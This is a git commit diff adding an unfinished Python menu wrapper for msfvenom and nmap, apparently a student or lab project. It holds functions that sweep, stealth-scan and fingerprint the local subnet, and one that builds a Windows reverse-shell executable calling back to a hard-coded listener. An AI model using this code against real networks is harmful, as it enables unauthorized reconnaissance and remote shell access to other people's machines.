43f00ca7c41399e6e6d4f8cdd185d96da35b5d34
Jaime Serranzana <jcs909@gmail.com>
2021-12-23 15:46:18 -0500

    Combined code

--- main.py
+++ main.py
@@ -1,35 +1,147 @@
 #!/usr/bin/env python3                # specify the interpreter
 
-
-### IMPORT STATEMENTS ###
-import sys  # import the sys library
-import subprocess
-
+# Varibles/Imports
+import os
+from colorama import Fore, Back, Style
+import subprocess # import the subprocess library
+import socket # import the socket library
 
 ### HELPER FUNCTIONS ###
-def is_even(file):  # define our line printing function
+def get_local():  # calls ifconfig
+    if_output = subprocess.run(['ifconfig']) # uses the subprocess function to run the ifconfig command
+    return if_output
 
-    for line in file:  # loop through every line in the file
+def list_payloads(): # lists all the msfvenom payloads
+    msf_payloads = subprocess.run(['msfvenom','-l','payloads']) # uses the subprocess function to run the msfvenom function and get a list of the msfvenom payloads
+    return msf_payloads
 
-        line = line.rstrip()  # remove the trailing newlines
+def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
+    payload = subprocess.run(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe']) # payload creation with hardcoded options
+    return payload
 
-        for nums in line:  # loop through each line
+def get_ip(): # gets ip address of local computer
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip_address = s.getsockname()[0]
+    return ip_address
 
-            print(nums)  # print each word
+def get_subnet(): # gets the first three octets of the local hosts ipv4 address and adds 1-255
+    local_address = get_ip()
+    ipremoved =''.join(local_address.rpartition('.')[:2])
+    subnet = ipremoved + "1-255"
+    return subnet
+
+def ping_sweep(): # does a sweep of the local network using nmap
+    subnet = get_subnet()
+    sweep = subprocess.run(['nmap','-sP',subnet])
+    return sweep
+    
+def ping_scan(): # does a stealth scan for machines with open ports in the local network using nmap
+    subnet = get_subnet()
+    stealth_scan = subprocess.run(['sudo','nmap','-sS',subnet])
+    return stealth_scan
+
+def os_scan(): # tries to find the os of machines on the local network
+    subnet = get_subnet()
+    operating_systems = subprocess.run(['sudo','nmap','-O',subnet])
+    return operating_systems
+    
+#Main Script
+#Varibles
+pastPackets = ()
+baseSearch = ("msfvenom -l payloads |")
 
 
-### MAIN FUNCTION ###
-def main():  # define a main function
+#allowable commands
+os.system('cls' if os.name == 'nt' else "printf '\033c'")
+menuOutput = "c", "C", "p", "P"
 
-    file_to_open = sys.argv[1]  # get the file name from the cmd line
+#Asking the user the target's operating system
+print(Fore.RED + "MSFVenom Wrapper:")
+#Main Menu
+print("Welcome to our MSFVenom wrapper that will help you through creating a packet with step by step questions guided.")
+print()
+print("   Options:  ")
+print()
+print("   C - Create New Packet")
+print("   P - Past Packet ")
+print()
 
-    opened_file = open(file_to_open)  # open the file
+userInput = input(Fore.WHITE + "Command Line: ")
 
-    is_even(opened_file)  # call our print words function with the open file
+#Testing if the operation system is a valid system if not loop until right
+while userInput not in menuOutput:
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + str(userInput) + " is not a valid option.")
+  print("   Options:  ")
+  print()
+  print("   C - Create New Packet")
+  print("   P - Past Packet ")
+  print()
+  userInput = input(Fore.WHITE + "Command Line: ")
 
-    opened_file.close()  # close the file when done
+#Payload Creator
+def createPayload():
+  global packetFinal
+  packetCreation = 1
+  global packetSearch
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + "Payload Creation:")
+  print("Welcome, to allow for easier creation of your payload we will run you through some questions limiting to what is best suited for your needs then allowing you to pick from a more directed list of packets.")
+  print()
+  print("   (   If unkown press enter to skip question   )")
+  print()
 
+  #OS Question 1
+  print("   Question 1: What is the targeted operating system? ")
+  print("   Options: linux, mac, windows")
+  print()
+  OS = input(Fore.WHITE + "Command Line: ")
 
-### DUNDER CHECK ###
-if __name__ == '__main__':  # dunder check
-    main()  # call the main function
+  #If not command for OS
+  operatingSystem = "linux", "windows", "mac"
+  while OS not in operatingSystem:
+   os.system('cls' if os.name == 'nt' else "printf '\033c'")
+   print(Fore.RED + str(OS) + " is not a valid operating system, what is your target's Operating System?")
+   print("Options: Linux, Mac, Windows")
+   print()
+   OS = input(Fore.WHITE + "Command Line: ")
+  
+  #Adds OS to search
+  packetSearch = (str(baseSearch) + " grep " + str(OS) + " |")
+  packetFinal = ""
+
+  while packetCreation == 1:
+    os.system('cls' if os.name == 'nt' else "printf '\033c'")
+
+    #Grep Question 2/...
+    print(Fore.RED + "   Question 2: Are there any certain keys you wish to grep for? ")
+    print("   Examples: reverse, x86, windows")
+    print("   Note: If nothing else just press enter")
+    print()
+    OS = input(Fore.WHITE + "Command Line: ")
+    if OS == "":
+      packetFinal = (str(packetSearch) + " grep -iv meterpreter | grep -v staged")
+      packetCreation = 0
+
+    else:
+      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
+
+def  Lportnhost():
+  #Find LPort and LHost
+  print()
+
+def finlization():
+  #Type of payload and naming payload
+  print()
+
+ 
+
+#Main Execution Program
+if userInput == "C" or userInput == "c":
+    createPayload()
+
+print()
+print("Final Output")
+print(str(packetFinal))
+
